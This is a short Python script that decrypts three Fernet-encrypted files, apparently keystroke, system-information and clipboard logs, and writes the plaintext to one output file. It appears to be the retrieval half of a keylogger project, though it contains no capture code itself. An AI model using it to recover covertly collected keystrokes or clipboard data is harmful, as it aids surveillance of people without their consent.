from cryptography.fernet import Fernet

#Encryption Key via Fernet
encyrption_key = ""


keys_info_encrypted = "encrypted_key_info.txt"
sys_info_encrypted = "encrypted_sys_info.txt"
clipboard_info_encrypted = "encrypted_clipboard_info.txt"



encrypted_files = [keys_info_encrypted, sys_info_encrypted, clipboard_info_encrypted]
count = 0


for decrypting_files in encrypted_files:

    with open(encrypted_files[count], 'rb') as file_encrypted:
        data = file_encrypted.read()

    fernet = Fernet(encyrption_key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as file_decrypted:
        file_decrypted.write(decrypted)

    count += 1
